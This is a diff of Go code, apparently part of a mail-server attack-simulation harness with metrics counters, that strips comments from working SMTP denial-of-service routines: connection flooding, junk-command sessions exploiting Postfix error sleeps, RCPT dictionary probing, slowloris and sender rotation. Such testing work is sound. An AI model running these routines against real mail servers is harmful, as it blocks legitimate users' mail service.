@@ -8,8 +8,6 @@ import (
 	"time"
 )
 
-// runAttack выполняет одну "единицу" атаки согласно конфигурации.
-// Вызывается горутинами-воркерами в цикле.
 func runAttack(cfg AttackConfig, smtpAddr string) {
 	switch cfg.Type {
 	case "connection_flood":
@@ -29,7 +27,6 @@ func runAttack(cfg AttackConfig, smtpAddr string) {
 	}
 }
 
-// attackConnectionFlood открывает и сразу закрывает соединения.
 func attackConnectionFlood(cfg AttackConfig, addr string) {
 	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
 	metricsAttackConnections.Inc()
@@ -37,13 +34,11 @@ func attackConnectionFlood(cfg AttackConfig, addr string) {
 		return
 	}
 	defer conn.Close()
-	// Читаем приветствие и уходим
 	buf := make([]byte, 256)
 	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
 	conn.Read(buf)
 }
 
-// attackJunkSession подключается и шлёт много невалидных команд.
 func attackJunkSession(cfg AttackConfig, addr string) {
 	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
 	metricsAttackConnections.Inc()
@@ -54,15 +49,13 @@ func attackJunkSession(cfg AttackConfig, addr string) {
 	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
 	buf := make([]byte, 512)
-	conn.Read(buf) // баннер
+	conn.Read(buf)
 
 	n := cfg.JunkCommandsPerSession
 	if n == 0 {
 		n = 50
 	}
 	for i := 0; i < n; i++ {
-		// Invalid commands cause Postfix to sleep smtpd_error_sleep_time (1s) per error,
-		// keeping the smtpd slot occupied and blocking legitimate connections.
 		fmt.Fprintf(conn, "XJUNK%d\r\n", i)
 		conn.Read(buf)
 		metricsAttackMessages.Inc()
@@ -70,7 +63,6 @@ func attackJunkSession(cfg AttackConfig, addr string) {
 	fmt.Fprintf(conn, "QUIT\r\n")
 }
 
-// attackRcptDictionary шлёт много RCPT TO с несуществующими адресами.
 func attackRcptDictionary(cfg AttackConfig, addr string) {
 	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
 	metricsAttackConnections.Inc()
@@ -81,7 +73,7 @@ func attackRcptDictionary(cfg AttackConfig, addr string) {
 	conn.SetDeadline(time.Now().Add(60 * time.Second))
 
 	buf := make([]byte, 512)
-	conn.Read(buf) // баннер
+	conn.Read(buf)
 
 	from := pickSender(cfg)
 	fmt.Fprintf(conn, "EHLO attacker.test\r\n")
@@ -102,7 +94,6 @@ func attackRcptDictionary(cfg AttackConfig, addr string) {
 	fmt.Fprintf(conn, "QUIT\r\n")
 }
 
-// attackSlowLoris открывает соединение и очень медленно шлёт EHLO.
 func attackSlowLoris(cfg AttackConfig, addr string) {
 	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
 	metricsAttackConnections.Inc()
@@ -119,18 +110,16 @@ func attackSlowLoris(cfg AttackConfig, addr string) {
 
 	buf := make([]byte, 256)
 	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-	conn.Read(buf) // баннер
+	conn.Read(buf)
 
-	// Шлём EHLO по одному байту с паузами — держим соединение открытым
 	cmd := "EHLO slow.attacker.test\r\n"
-	conn.SetWriteDeadline(time.Time{}) // снимаем дедлайн записи
+	conn.SetWriteDeadline(time.Time{})
 	for _, b := range []byte(cmd) {
 		conn.Write([]byte{b})
 		time.Sleep(delay)
 	}
 }
 
-// attackSenderRotation шлёт письма с ротацией MAIL FROM / EHLO.
 func attackSenderRotation(cfg AttackConfig, addr string) {
 	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
 	metricsAttackConnections.Inc()
@@ -141,7 +130,7 @@ func attackSenderRotation(cfg AttackConfig, addr string) {
 	conn.SetDeadline(time.Now().Add(30 * time.Second))
 
 	buf := make([]byte, 512)
-	conn.Read(buf) // баннер
+	conn.Read(buf)
 
 	from := pickSender(cfg)
 	ehloHost := randomSubdomain()
@@ -160,7 +149,6 @@ func attackSenderRotation(cfg AttackConfig, addr string) {
 	metricsAttackMessages.Inc()
 }
 
-// pickSender выбирает случайный адрес отправителя из конфига.
 func pickSender(cfg AttackConfig) string {
 	domains := cfg.SenderDomains
 	if len(domains) == 0 {
